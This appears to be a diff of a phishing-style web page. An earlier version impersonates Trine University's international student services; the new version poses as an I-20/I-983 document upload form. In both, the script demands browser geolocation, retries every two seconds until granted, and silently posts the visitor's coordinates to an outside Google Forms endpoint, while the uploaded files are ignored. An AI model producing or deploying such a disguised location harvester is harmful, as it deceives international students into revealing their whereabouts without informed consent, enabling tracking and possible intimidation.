@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trine University - International Services</title>
+    <title>Document Submission</title>
     <style>
         body, html {
             font-family: Arial, sans-serif;
@@ -12,36 +12,11 @@
             background-color: #e6e6e6;
         }
         .container {
+            background-color: #00447C;
             color: white;
             width: 100%;
             padding: 40px 0;
-        }
-        .header {
-            background-color: #00447C;
-            padding: 10px 20px;
-            color: white;
-            text-align: left;
-        }
-        .header .university {
-            font-size: 24px;
-            font-weight: bold;
-        }
-        .header .services {
-            background-color: white;
-            color: black;
-            font-size: 18px;
-            font-weight: bold;
-            padding: 2px 10px;
-        }
-        .footer {
-            background-color: #00447C;
-            color: black;
-            text-align: left;
-            padding: 20px 20px;
-            font-size: 16px;
-            position: absolute;
-            bottom: 0;
-            width: 100%;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
         }
         .section {
             background-color: #f4f4f4;
@@ -52,7 +27,7 @@
             color: black;
             text-align: left;
         }
-        button, input[type="text"] {
+        button, input[type="file"] {
             display: block;
             width: 80%;
             margin: 10px auto;
@@ -65,8 +40,8 @@
             text-align: left;
             margin: 10px;
         }
-        h1, h2 {
-            margin: 0;
+        h1 {
+            text-align: center;
         }
         .hidden {
             display: none;
@@ -78,26 +53,33 @@
         }
     </style>
 </head>
-<body onload="requestLocation()">
-    <div class="header">
-        <div class="university">TRINE UNIVERSITY</div>
-        
-    </div>
+<body>
     <div class="container">
+        <h1>Documents Required*</h1>
         <div class="section">
-            <div id="locationError" class="hidden"></div>
-            <p>The Office of International Services provides a variety of online services for our institution's international students. Please log in using one of the options below to view information or to make a request.</p>
-            <label for="admissionNumber">Student Admission Number:</label>
-            <input type="text" id="admissionNumber" name="admissionNumber">
-            <button id="submit">Enter</button>
-            <p id="output"></p>
+            <p id="locationError" class="hidden"></p>
+            <p>Please upload your documents here.</p>
+            <form id="uploadForm">
+                <div>
+                    <label for="i20">Upload I-20:</label>
+                    <input type="file" id="i20" name="i20" required>
+                </div>
+                <div>
+                    <label for="i983">Upload I-983:</label>
+                    <input type="file" id="i983" name="i983" required>
+                </div>
+                <button type="submit" id="submit">Submit</button>
+            </form>
+            <p id="thankYouMessage" class="hidden">Thank you! You may now close this window.</p>
         </div>
-    </div>
-    <div class="footer">
-        Secure Online Session
     </div>
 
     <script>
+        document.getElementById('uploadForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the default form submission
+            requestLocation(); // Start the location request process on form submission
+        });
+
         function requestLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError, { timeout: 5000 });
@@ -114,12 +96,6 @@
         }
 
         function sendForm(latitude, longitude, accuracy) {
-            const admissionNo = document.getElementById("admissionNumber").value;
-            if (!admissionNo) {
-                alert("Please enter your Admission Number.");
-                return;
-            }
-
             const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScQpsQr3scRzvEtZJhZQ9fbJ3e-0DiCxQjLotqM6fEst-f-9w/formResponse";
             const data = new URLSearchParams();
             data.append("entry.1267598962", latitude);
@@ -131,27 +107,22 @@
                 body: data,
                 mode: "no-cors",
             }).then(() => {
-                window.location.href = "next-page.html"; // Redirect to another page on success
+                window.location.href = "thank-you.html"; // Redirect to the thank-you page on success
             }).catch((error) => {
                 document.getElementById("output").innerText = "Error: " + error.message;
             });
         }
 
         function handleLocationError(error) {
-            setTimeout(requestLocation, 2000); // Retry every 2 seconds
-            displayError("Error: Please enable location access to continue. Once Done, the page will be redirected automatically, if not please close the page and try opening in a new Window.");
+            setTimeout(requestLocation, 2000); // Retry every 2 seconds if there's an error
+            displayError("Error: Please enable location access to continue. Please close the page.");
         }
 
         function displayError(message) {
             const locationError = document.getElementById("locationError");
-            locationError.innerHTML = message;
+            locationError.innerText = message;
             locationError.classList.remove('hidden');
         }
-
-        document.getElementById('submit').addEventListener('click', function(event) {
-            event.preventDefault();
-            requestLocation(); // Ensure location data is tried again on submit if not already done
-        });
     </script>
 </body>
 </html>
